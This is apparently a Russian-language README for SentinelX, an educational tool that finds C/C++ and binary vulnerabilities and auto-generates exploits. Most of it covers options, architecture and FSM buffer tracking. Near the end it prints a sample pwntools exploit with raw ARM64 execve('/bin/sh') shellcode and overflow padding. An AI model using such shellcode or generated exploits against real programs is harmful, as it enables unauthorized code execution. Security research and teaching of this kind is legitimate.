# SentinelX

Система статического анализа и генерации эксплойтов для обнаружения уязвимостей в C/C++ коде и бинарных файлах.

## Функционал

### Анализ исходного кода
- Обнаружение небезопасных функций (gets, strcpy, strcat, sprintf, scanf)
- Анализ переполнения буфера
- Анализ целочисленных переполнений
- Taint analysis (отслеживание распространения непроверенных данных)
- Анализ стека и вызовов функций

### Анализ бинарных файлов
- Дизассемблирование (x86, x86_64, ARM, ARM64)
- Поиск опасных вызовов в ассемблере
- Поиск ROP-гаджетов для построения цепочек
- Анализ защит (NX, ASLR, PIE, Stack Canary)

### Генерация эксплойтов
- Автоматическая генерация эксплойтов для найденных уязвимостей
- Поддержка форматов: Python, C
- Генерация shellcode для разных архитектур
- Построение ROP-цепочек для обхода защит

### Форматы вывода
- Текстовый отчет с деталями уязвимостей
- JSON для автоматизации и интеграции
- Фильтрация по уровню уверенности (LOW/MEDIUM/HIGH/CERTAIN)

## Требования

- C++17 компилятор (GCC 8+, Clang 7+, MSVC 2019+)
- CMake 3.15+
- LIEF библиотека (включена в проект)

## Сборка

```bash
# Стандартная сборка
./build.sh

# Сборка без LIEF (только анализ исходников)
SENTINELX_USE_LIEF=OFF ./build.sh

# Ручная сборка
mkdir build && cd build
cmake .. -DSENTINELX_USE_LIEF=ON
cmake --build . --config Release
```

Собранный бинарник: `build/SentinelX`

## Использование

### Базовые примеры

```bash
# Анализ исходника
./build/SentinelX --source vulnerable.c

# Анализ бинарного файла
./build/SentinelX --binary ./program

# Комбинированный анализ
./build/SentinelX --source ./src --binary ./program

# JSON вывод
./build/SentinelX --source ./src --json

# Фильтрация по уверенности
./build/SentinelX --source ./src --min-confidence HIGH
```

### Генерация эксплойтов

```bash
# Генерация Python эксплойтов
./build/SentinelX --binary ./vuln --generate-exploits

# Генерация в обоих форматах
./build/SentinelX --binary ./vuln --generate-exploits --exploit-format both

# Указание директории вывода
./build/SentinelX --binary ./vuln --generate-exploits --exploit-output ./my_exploits

# Без shellcode/ROP
./build/SentinelX --binary ./vuln --generate-exploits --no-shellcode --no-rop
```

### Опции

**Анализ:**
- `--source <PATH>` - путь к исходнику или директории
- `--binary <PATH>` - путь к бинарному файлу
- `--no-source` - отключить анализ исходников
- `--no-binary` - отключить анализ бинарников
- `--verbose` - показывать INFO-уровень
- `--json` - вывод в JSON
- `--min-confidence <LEVEL>` - минимальный уровень (LOW/MEDIUM/HIGH/CERTAIN)

**Эксплойты:**
- `--generate-exploits` - включить генерацию
- `--exploit-format <FMT>` - формат (python/c/both)
- `--exploit-output <DIR>` - директория вывода
- `--no-shellcode` - без shellcode
- `--no-rop` - без ROP цепочек

## Архитектура

### Основные компоненты

```
SentinelX/
├── analyzer.cpp/h           # Главный анализатор, координация
├── binary_parser.cpp/h      # Парсинг бинарников через LIEF
├── disassembler.cpp/h       # Дизассемблирование инструкций
├── detectors.cpp/h          # Детекторы уязвимостей
│
├── Анализаторы:
│   ├── buffer_analysis.cpp/h      # Анализ буферов
│   ├── taint_analysis.cpp/h       # Taint analysis
│   ├── stack_analyzer.cpp/h       # Анализ стека
│   ├── call_site_analyzer.cpp/h   # Анализ вызовов
│   └── arithmetic_analyzer.cpp/h  # Арифметические операции
│
├── Генераторы эксплойтов:
│   ├── exploit_engine.cpp/h       # Движок генерации
│   ├── shellcode_generator.cpp/h  # Генератор shellcode
│   ├── gadget_finder.cpp/h        # Поиск ROP гаджетов
│   ├── rop_builder.cpp/h          # Построение ROP цепочек
│   └── exploit_templates.cpp/h    # Шаблоны эксплойтов
│
├── FSM (конечные автоматы):
│   ├── fsm.cpp/h/hpp              # Реализация FSM
│   └── buffer_analysis FSM        # FSM для отслеживания буферов
│
└── Утилиты:
    ├── utils.cpp/h           # Вспомогательные функции
    ├── json_output.cpp/hpp   # JSON сериализация
    └── types.h               # Общие типы данных
```

### Поток работы

1. **Парсинг** → `binary_parser` загружает бинарник через LIEF
2. **Дизассемблирование** → `disassembler` разбирает инструкции
3. **Анализ** → детекторы и анализаторы ищут уязвимости
4. **FSM** → отслеживают состояние буферов/переменных
5. **Генерация** → `exploit_engine` создает эксплойты
6. **Вывод** → результаты в текст или JSON

## Автоматное программирование (FSM)

SentinelX использует конечные автоматы для отслеживания состояний во время анализа.

### SimpleFSM - Лексический анализ

Отслеживает контекст при парсинге исходного кода:

**Состояния:**
- `Start` - начальное состояние
- `Identifier` - идентификатор (переменная/функция)
- `Number` - числовой литерал
- `StringLiteral` - строковый литерал
- `CharLiteral` - символьный литерал
- `CommentLine` - однострочный комментарий
- `CommentBlock` - многострочный комментарий

**Применение:** Позволяет корректно парсить код, игнорируя комментарии и литералы при поиске опасных вызовов.

```cpp
SimpleFSM fsm;
fsm.process("char buf[100]; gets(buf); // опасно");
// Автомат корректно отличит код от комментария
```

### BufferFSM - Отслеживание буферов

Отслеживает жизненный цикл буферов для обнаружения переполнений:

**Состояния:**
- `Unknown` - буфер неизвестен
- `Allocated` - буфер объявлен (`char buf[100]`)
- `Initialized` - в буфер произведена запись
- `Tainted` - обнаружено переполнение или небезопасная операция
- `Sanitized` - буфер проверен (безопасен)

**События (transitions):**
- `on_declare(key, size)` - объявление буфера → Allocated
- `on_write(key, bytes)` - запись данных → Initialized/Tainted
- `on_read(key, bytes)` - чтение данных
- `on_taint(key)` - пометка как небезопасного → Tainted
- `on_sanitize(key)` - проверка размера → Sanitized
- `on_reset(key)` - сброс счетчиков → Initialized

**Пример работы:**

```c
char buffer[100];          // on_declare → Allocated (size=100)
strcpy(buffer, input);     // on_write(unknown_size) → Tainted (небезопасно)

char safe[100];            // on_declare → Allocated
strncpy(safe, input, 99);  // on_write(99) → Initialized (безопасно, 99 < 100)
```

**Отслеживание кумулятивных переполнений:**

```c
char buf[100];             // on_declare(100) → Allocated
strcpy(buf, str1);         // on_write(60) → Initialized (60 < 100, OK)
strcat(buf, str2);         // on_write(60) → Tainted (60+60=120 > 100, переполнение!)
```

FSM накапливает записи (`bytes_written`) и обнаруживает переполнение через несколько операций.

**Преимущества подхода:**
- Отслеживание состояния между вызовами
- Обнаружение сложных сценариев (multiple writes)
- Четкая модель переходов между состояниями
- Легко расширяется новыми состояниями/событиями

## Тестирование

Результаты тестирования основного функционала:

### ✅ Анализ исходного кода
```bash
./build/SentinelX --source tests/buffer_overflow/vulnerable.c
```
- Обнаружено: gets(), strcpy(), strcat(), sprintf(), scanf() с %s
- Уровни: CRITICAL/HIGH с HIGH/CERTAIN confidence
- Вывод: файл, строка, функция, рекомендации

### ✅ Анализ бинарных файлов
```bash
./build/SentinelX --binary build/a.out
```
- Обнаружено: опасные вызовы в ассемблере (___sprintf_chk, ___strcat_chk, ___strcpy_chk)
- Показан дизассемблированный код с контекстом
- Указаны: архитектура (arm64), секция (.text), offset, return address

### ✅ JSON вывод
```bash
./build/SentinelX --source tests/buffer_overflow/vulnerable.c --json
```
- Структурированный JSON с полями: file, line, function, kind, severity, confidence, message
- Готов к интеграции в CI/CD

### ✅ Генерация эксплойтов
```bash
./build/SentinelX --binary /tmp/vuln_test --generate-exploits --exploit-format both
```
- Генерирует Python (pwntools) и C эксплойты
- Включает shellcode для execve("/bin/sh") под архитектуру (x86/x86_64/ARM/ARM64)
- Корректный синтаксис и компиляция
- Расчет padding до return address (120 байт для ARM64)
- Поддержка ROP цепочек для обхода NX/DEP

## Примеры обнаружения

**Исходный код (vulnerable.c:16):**
```c
char buffer[100];
gets(buffer);  // CRITICAL
```
→ `[CRITICAL][CERTAIN] SRC_UNSAFE_CALL_gets`

**Бинарный анализ (a.out:0x1000006d4):**
```asm
0x1000006d4: bl 0x1000009e8 ; ___sprintf_chk
```
→ `[WARNING][MEDIUM] BIN_UNSAFE_CALL_sprintf`

**Сгенерированный Python эксплойт:**
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'aarch64'
binary_path = '/tmp/vuln_test'

# Shellcode: ARM64 shellcode: execve("/bin/sh", NULL, NULL)
shellcode = (b"\xe0\x45\x8c\xd2\x20\xcd\xad\xf2\x20\x8f\xdf\xf2\x00\x01\x00\xf9"
    b"\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x01\x00\x00\xd4")

payload = b""
payload += shellcode
payload += b"A" * 120  # Padding to return address

io = process(binary_path)
io.sendline(payload)
io.interactive()
```

## Исправления

**Исправлено в генерации эксплойтов:**
1. Изменен порог severity с HIGH на WARNING для бинарных находок (src/main.cpp:299)
2. Исправлен синтаксис многострочного shellcode в Python (src/exploit_templates.cpp:219,231)

## Лицензия

Образовательный проект для демонстрации техник анализа и исследований безопасности.
